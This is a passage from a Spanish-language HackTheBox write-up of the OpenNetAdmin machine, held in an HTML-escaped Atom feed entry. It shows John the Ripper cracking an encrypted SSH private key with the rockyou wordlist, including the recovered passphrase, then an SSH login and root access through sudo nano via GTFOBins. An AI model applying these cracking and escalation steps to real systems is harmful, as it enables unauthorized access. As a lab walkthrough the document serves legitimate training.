9094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Copie el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hash&lt;/code&gt; y lo pegue en un archivo nuevo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashs&lt;/code&gt; para hacerle fuerza bruta con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john the ripper&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[Fr4nzisko@RedTeam]─[/home/Fr4nzisko/Desktop]
└──╼ john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt hashs
Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSH &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RSA/DSA/EC/OPENSSH &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSH private keys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 32/64]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Cost 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;KDF/cipher &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MD5/AES &lt;span class=&quot;nv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MD5/3DES &lt;span class=&quot;nv&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Bcrypt/AES]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 0 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
Cost 2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;iteration count&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 1 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit &lt;span class=&quot;nb&quot;&gt;false &lt;/span&gt;positives, so it will keep trying even after
finding a possible candidate.
Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
bloodninjas      &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;id_rsa&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
1g 0:00:00:05 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2021-07-12 16:10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.1855g/s 2660Kp/s 2660Kc/s 2660KC/sie168..&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;7¡Vamos!
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Le di permisos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;600&lt;/code&gt; a la id_rsa y probe a autenticarme con el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;joanna&lt;/code&gt; por SSH desde la máquina víctima y funciono.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/125322013-922f0f80-e33d-11eb-9804-f85f1f2ae6b0.png&quot; alt=&quot;id_rsa2 (1)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya pude visualizar la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; del usuario, ahora solo faltaba la escalada de privilegios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/125322194-c9052580-e33d-11eb-96e0-3c2ca8a287d5.jpg&quot; alt=&quot;user&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 align=&quot;center&quot;&gt;&lt;b&gt;ESCALADA DE PRIVILEGIOS&lt;/b&gt;&lt;/h1&gt;

&lt;p&gt;Haciendo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; como todos los usuarios me permitía ejecutar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nano&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; a un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;priv&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/125322700-56487a00-e33e-11eb-894f-c374c5c7ad74.png&quot; alt=&quot;priv&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Me dirigí a &lt;a href=&quot;https://gftobins.github.io&quot;&gt;gftobins&lt;/a&gt; y encontré una manera de aprovecharme de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nano&lt;/code&gt; para la escalada.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/125322596-3dd85f80-e33e-11eb-86cd-c85a76726d85.png&quot; alt=&quot;Captura de pantalla (655)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hice lo pasos que me pedía y consegui &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/69093629/125322935-90b21700-e33e-11eb-9a0b-f3ff219cf2c0.png&quot; alt=&quot;padentros&quot; /&gt;&lt;/p&gt;</content><author><name>Fr4nzisko</name></author><category term="HackTheBox" /><category term="OpenNetAdmin" /><category term="gobuster" /><category term="linpeas" /><category term="ssh2john" /><summary type="html">Esta máquina es de dificultad fácil, me gusto más la intrusión al aprovecharme de un panel de control vulnerable llamado OpenNetAdmin, use un exploit que te explotaba la vulnerabilidad del panel y te otorgaba ejecución remota de código arbitrario. Esta vez la escalada fue bastante sencilla de completar, al hacer `sudo -l` me permitía como cualquier usuario ejecutar el binario de `nano` a un archivo llamado `priv`.</summary></entry></feed>